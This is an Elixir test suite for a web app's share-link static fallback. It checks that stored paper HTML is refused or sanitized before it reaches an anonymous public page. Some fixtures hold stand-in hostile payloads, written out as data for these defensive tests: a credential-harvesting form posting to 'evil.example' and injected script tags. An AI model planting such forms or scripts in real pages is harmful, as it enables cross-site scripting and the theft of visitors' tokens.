defmodule BarkparkWeb.ShareLinkStaticDriftTest do
  @moduledoc """
  `/s/:token`'s STATIC paper fallback must obey the canonical reader authority
  (`Content.Papers.reader_source/3`), not pick its own source.

  The static render only fires when the link's tenancy scope no longer resolves
  and `serve/3` cannot 302 to the live reader. Before this suite it chose
  between `Projection.read_blocks/1` on the RAW content and a verbatim
  `content["body_html"]` — reading the exact two inputs the authority exists to
  arbitrate, and applying none of its rules. So the ANONYMOUS public escape
  hatch was a softer door than the `BulldocsLive` door it substitutes for,
  which raises `plug_status: 422` on the same tuple.

  METHOD. Asserting the route returns 200 with some HTML is vacuous — it did
  that before. Every test below asserts on a DIFFERENCE the authority produces
  and the old hand-rolled selection did not, and each first pins the authority's
  own verdict on the stored row so a fixture that failed to reach the intended
  population cannot pass silently.
  """
  use BarkparkWeb.ConnCase, async: true

  import Barkpark.TenancyFixtures

  alias Barkpark.Content
  alias Barkpark.Content.{Document, Labels, Papers}
  alias Barkpark.PortableDoc.Render
  alias Barkpark.Repo
  alias Barkpark.Sharing.Links

  @dataset "production"

  # Forces the paper redirect in `serve/3` to miss, so `/s/:token` takes the
  # STATIC fallback while the link keeps its real workspace/project ids.
  defmodule MissingRedirectTenancy do
    def get_workspace_by_id(_id), do: nil
    def get_project_by_id(_id), do: nil
  end

  setup do
    Barkpark.LabelFixtures.register_tags!(@dataset)

    ws = create_workspace!("sl-drift-ws")
    proj = create_project!(ws, "sl-drift-proj")
    scope = [workspace_id: ws.id, project_id: proj.id]

    Application.delete_env(:barkpark, :shares)

    %{ws: ws, proj: proj, scope: scope}
  end

  # A published paper carrying `content`, then force-written so the probe
  # survives (publish regenerates the derived cache and would overwrite it).
  defp paper_with_content!(slug, content, scope) do
    {:ok, _} =
      Content.create_document(
        "paper",
        %{
          "doc_id" => slug,
          "title" => "Drift Probe",
          "content" => Barkpark.LabelFixtures.with_labels(%{"body_html" => "<p>seed</p>"})
        },
        @dataset,
        scope
      )

    {:ok, _} = Content.publish_document(slug, "paper", @dataset, scope)

    {:ok, row} = Content.get_document(slug, "paper", @dataset, scope)

    merged = Map.merge(row.content, content)

    row
    |> Document.changeset(%{"content" => merged, "rev" => "drift-#{slug}"})
    |> Repo.update!()

    {:ok, stored} = Content.get_document(slug, "paper", @dataset, scope)
    stored
  end

  defp static_get(slug, scope) do
    {:ok, {token, _link}} =
      Links.create(%{
        kind: "doc",
        ref_type: "paper",
        ref_id: slug,
        dataset: @dataset,
        access: "read",
        workspace_id: scope[:workspace_id],
        project_id: scope[:project_id]
      })

    build_conn()
    |> Plug.Conn.put_private(:share_link_tenancy, MissingRedirectTenancy)
    |> get("/s/#{token}")
  end

  # ── divergence: a CURRENT-stamp cache carrying prose the blocks lack ───────
  #
  # This is the one population the 422 was built for: the row claims THIS
  # renderer emitted these bytes from these blocks, and the byte compare says
  # otherwise, so nothing external can explain the gap and neither half may be
  # served. The old fallback rendered the blocks and answered 200 — silently
  # picking a winner in exactly the case the authority refuses to pick one.
  test "a DIVERGENT cache refuses at 422 and serves neither half", %{scope: scope} do
    slug = "sl-drift-divergent"

    blocks = [
      %{"id" => "p1", "type" => "paragraph", "text" => "Canonical block prose."},
      %{"id" => "h1", "type" => "heading", "level" => 2, "text" => "A section"}
    ]

    fresh = Render.render_blocks(blocks, Labels.paper_render_opts(@dataset, nil, scope))

    stored =
      paper_with_content!(
        slug,
        %{
          "blocks" => blocks,
          "body_html" => fresh <> "<p>Prose that exists in no block.</p>",
          "body_html_sv" => Render.body_html_render_version()
        },
        scope
      )

    # Fixture non-vacuity: prove the row actually reaches the divergent arm.
    # A fixture that landed on :coherent or {:stale, _} would make the assertions
    # below pass for the wrong reason.
    assert {:error, :ambiguous_source} = Papers.reader_source(stored, @dataset, scope)

    resp = static_get(slug, scope)

    assert resp.status == 422,
           "the anonymous static fallback must not be a softer door than BulldocsLive"

    refute resp.resp_body =~ "Canonical block prose.",
           "refusing means serving neither half — not quietly preferring the blocks"

    refute resp.resp_body =~ "Prose that exists in no block."

    # The refusal REASON stays server-side: the page is ErrorHTML's generic card,
    # so a token holder cannot tell "redacted content exists here" from "this
    # paper has no readable source".
    refute resp.resp_body =~ "ambiguous_source"
  end

  # ── the HTML-only arm: sanitized, not verbatim ────────────────────────────
  #
  # `reader_source/3`'s `{:html, _}` return is `HtmlSanitizer`-filtered. The old
  # `nil` arm handed the stored bytes straight to `ScopedPaperHTML`'s
  # `raw(@body_html)` on an anonymous public page.
  test "an HTML-only paper is served SANITIZED, not verbatim", %{scope: scope} do
    slug = "sl-drift-html-only"

    poisoned =
      ~s|<form action="https://evil.example"><input name="token"></form>| <>
        ~s|<script>alert(1)</script><p>Readable legacy prose.</p>|

    stored =
      paper_with_content!(
        slug,
        %{"blocks" => nil, "body" => nil, "body_html" => poisoned},
        scope
      )

    assert {:html, "<p>Readable legacy prose.</p>"} =
             Papers.reader_source(stored, @dataset, scope)

    resp = static_get(slug, scope)

    assert resp.status == 200
    assert resp.resp_body =~ "Readable legacy prose."

    refute resp.resp_body =~ "<script>alert(1)</script>",
           "the static fallback must not emit stored script into an anonymous page"

    refute resp.resp_body =~ "https://evil.example",
           "the credential-harvesting form must be stripped with it"
  end

  # ── the semantically-empty cache: refused, not served as a blank article ──
  test "a cache with no semantic content refuses at 422", %{scope: scope} do
    slug = "sl-drift-semantic-empty"

    stored =
      paper_with_content!(
        slug,
        %{"blocks" => nil, "body" => nil, "body_html" => "<script>steal()</script>"},
        scope
      )

    assert {:error, :semantic_empty} = Papers.reader_source(stored, @dataset, scope)

    resp = static_get(slug, scope)

    assert resp.status == 422
    refute resp.resp_body =~ "steal()"
  end

  # ── positive control: the 422 is NOT blanket ──────────────────────────────
  #
  # Without this, a change that made every static render refuse would pass the
  # three tests above.
  test "a COHERENT paper still renders its blocks at 200", %{scope: scope} do
    slug = "sl-drift-coherent"

    blocks = [
      %{"id" => "p1", "type" => "paragraph", "text" => "Perfectly readable prose."}
    ]

    fresh = Render.render_blocks(blocks, Labels.paper_render_opts(@dataset, nil, scope))

    stored =
      paper_with_content!(
        slug,
        %{
          "blocks" => blocks,
          "body_html" => fresh,
          "body_html_sv" => Render.body_html_render_version()
        },
        scope
      )

    assert {:blocks, ^blocks} = Papers.reader_source(stored, @dataset, scope)

    resp = static_get(slug, scope)

    assert resp.status == 200
    assert resp.resp_body =~ "Perfectly readable prose."
  end
end
